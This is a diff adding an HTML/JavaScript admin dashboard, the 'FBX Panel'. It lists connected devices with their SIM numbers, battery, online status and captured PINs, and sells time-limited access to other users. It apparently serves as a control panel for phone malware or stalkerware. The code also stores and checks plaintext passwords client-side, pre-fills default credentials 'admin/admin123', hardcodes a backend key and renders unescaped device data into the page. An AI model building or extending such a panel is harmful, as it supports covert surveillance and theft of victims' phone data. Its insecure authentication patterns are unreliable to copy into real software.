@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FBX Panel - Admin</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        :root { --bg: #f8f9fa; --card: #fff; --text: #1f2937; --muted: #6b7280; --primary: #e11d48; --primary-light: #ffe4e6; --border: #e5e7eb; --success: #10b981; --danger: #ef4444; }
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .header h1 { font-size: 24px; font-weight: 700; display: flex; align-items: center; gap: 8px; margin: 0; }
+        .header h1 span { color: var(--primary); }
+        .header-icons { display: flex; gap: 10px; }
+        .header-icons div { background: #e5e7eb; padding: 10px; border-radius: 50%; cursor: pointer; font-size: 16px; }
+
+        .stats-bar { background: var(--card); border-radius: 12px; padding: 15px; display: flex; justify-content: space-between; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.03); border: 1px solid var(--border); }
+        .stat { display: flex; align-items: center; gap: 6px; font-weight: 600; font-size: 14px; }
+        .stat.online { color: var(--success); }
+
+        .admin-section { background: var(--card); border-radius: 16px; padding: 15px; margin-bottom: 20px; border: 1px solid var(--border); }
+        .admin-section h3 { margin-top: 0; font-size: 16px; color: var(--primary); }
+        .form-row { display: flex; gap: 10px; margin-bottom: 10px; }
+        .form-row input, .form-row select { flex: 1; padding: 10px; border-radius: 8px; border: 1px solid var(--border); background: var(--bg); font-family: inherit; }
+        .btn { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
+
+        .device-card { background: var(--card); border-radius: 16px; padding: 15px; margin-bottom: 15px; border: 1px solid var(--border); }
+        .device-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 15px; }
+        .device-info h3 { margin: 0; font-size: 16px; }
+        .device-info p { margin: 4px 0 0; font-size: 12px; color: var(--muted); font-family: monospace; }
+        .status-badge { display: flex; align-items: center; gap: 5px; font-size: 12px; font-weight: 700; color: var(--success); }
+        .status-badge.offline { color: var(--danger); }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--success); }
+        .dot.offline { background: var(--danger); }
+        
+        .sim-info { display: flex; gap: 10px; margin-bottom: 15px; }
+        .sim-box { flex: 1; background: #f3f4f6; padding: 12px; border-radius: 10px; font-size: 13px; }
+        .sim-box label { color: var(--muted); font-weight: 600; display: block; margin-bottom: 6px; font-size: 11px; }
+
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><span>FBX</span> PANEL</h1>
+            <div class="header-icons">
+                <div onclick="refreshData()">🔄</div>
+            </div>
+        </div>
+
+        <!-- Login -->
+        <div id="loginBox" class="device-card">
+            <h3>Login</h3>
+            <div class="form-row"><input id="loginUser" placeholder="Username" value="admin"></div>
+            <div class="form-row"><input id="loginPass" type="password" placeholder="Password" value="admin123"></div>
+            <button class="btn" onclick="doLogin()">Login</button>
+        </div>
+
+        <!-- Dashboard -->
+        <div id="mainDash" class="hidden">
+            <!-- Admin Panel -->
+            <div id="adminPanel" class="admin-section hidden">
+                <h3>👑 Admin: Grant Access</h3>
+                <div class="form-row">
+                    <input id="newUser" placeholder="New Username">
+                    <input id="newPass" placeholder="New Password">
+                </div>
+                <div class="form-row">
+                    <select id="accessDuration">
+                        <option value="1">1 Day</option>
+                        <option value="7">7 Days</option>
+                        <option value="30">30 Days</option>
+                        <option value="90">90 Days</option>
+                        <option value="36500">Lifetime</option>
+                    </select>
+                </div>
+                <button class="btn" onclick="createUser()">Create User</button>
+            </div>
+
+            <div class="stats-bar">
+                <div class="stat online"><span class="dot"></span> <span id="onlineCount">0</span> Online</div>
+                <div class="stat total"><span id="totalCount">0</span> Total</div>
+            </div>
+
+            <div id="deviceContainer">
+                <div style="text-align:center; padding:20px; color:var(--muted)">No devices connected.</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- SUPABASE CONFIG ---
+        const SUPABASE_URL = "https://fmfxqjerktoclzmuited.supabase.co";
+        const SUPABASE_KEY = "sb_publishable_v8EhqjGh1B87NatTuypl9w_xS3V3JRF";
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        let currentUser = null;
+        let currentRole = 'user';
+
+        async function doLogin() {
+            const user = document.getElementById('loginUser').value;
+            const pass = document.getElementById('loginPass').value;
+
+            const { data, error } = await supabase
+                .from('users')
+                .select('*')
+                .eq('username', user)
+                .eq('password', pass)
+                .single();
+
+            if (error || !data) return alert("Invalid login");
+
+            // Check expiry
+            if (data.expires_at && new Date(data.expires_at) < new Date()) {
+                return alert("Your access has expired. Contact Admin.");
+            }
+
+            currentUser = data;
+            currentRole = data.role;
+
+            document.getElementById('loginBox').classList.add('hidden');
+            document.getElementById('mainDash').classList.remove('hidden');
+
+            if (currentRole === 'admin') {
+                document.getElementById('adminPanel').classList.remove('hidden');
+                loadAllDevices(); // Admin sees everything
+            } else {
+                loadUserDevices(data.id); // User sees only theirs
+            }
+        }
+
+        async function createUser() {
+            const u = document.getElementById('newUser').value;
+            const p = document.getElementById('newPass').value;
+            const days = parseInt(document.getElementById('accessDuration').value);
+
+            let expiresAt = null;
+            if (days !== 36500) {
+                const date = new Date();
+                date.setDate(date.getDate() + days);
+                expiresAt = date.toISOString();
+            }
+
+            const { error } = await supabase.from('users').insert([
+                { username: u, password: p, role: 'user', expires_at: expiresAt }
+            ]);
+
+            if (error) alert("Error: " + error.message);
+            else alert("User created successfully!");
+        }
+
+        async function loadAllDevices() {
+            const { data, error } = await supabase.from('devices').select('*');
+            if (!error) renderDevices(data);
+            else console.error(error);
+        }
+
+        async function loadUserDevices(userId) {
+            const { data, error } = await supabase.from('devices').select('*').eq('user_id', userId);
+            if (!error) renderDevices(data);
+            else console.error(error);
+        }
+
+        function renderDevices(devices) {
+            const container = document.getElementById('deviceContainer');
+            
+            if (!devices || devices.length === 0) {
+                container.innerHTML = '<div style="text-align:center; padding:20px; color:var(--muted)">No devices connected.</div>';
+                document.getElementById('onlineCount').innerText = "0";
+                document.getElementById('totalCount').innerText = "0";
+                return;
+            }
+
+            container.innerHTML = devices.map(d => `
+                <div class="device-card">
+                    <div class="device-header">
+                        <div class="device-info">
+                            <h3>${d.model || 'Unknown'}</h3>
+                            <p>${d.id}</p>
+                        </div>
+                        <div class="status-badge ${d.status === 'online' ? '' : 'offline'}">
+                            <span class="dot ${d.status === 'online' ? '' : 'offline'}"></span> ${d.status ? d.status.toUpperCase() : 'OFFLINE'}
+                        </div>
+                    </div>
+                    <div class="sim-info">
+                        <div class="sim-box"><label>SIM 1</label><div>${d.sim1 || '-'}</div></div>
+                        <div class="sim-box"><label>SIM 2</label><div>${d.sim2 || '-'}</div></div>
+                    </div>
+                    <div style="display:flex; gap:5px; margin-bottom:10px;">
+                        <span class="stat-pill">${d.battery || 'N/A'}</span>
+                        ${d.pin ? `<span class="stat-pill primary">PIN: ${d.pin}</span>` : ''}
+                    </div>
+                </div>
+            `).join('');
+
+            document.getElementById('onlineCount').innerText = devices.filter(d => d.status === 'online').length;
+            document.getElementById('totalCount').innerText = devices.length;
+        }
+
+        function refreshData() {
+            if(currentRole === 'admin') loadAllDevices();
+            else if(currentUser) loadUserDevices(currentUser.id);
+        }
+    </script>
+</body>
+      </html>
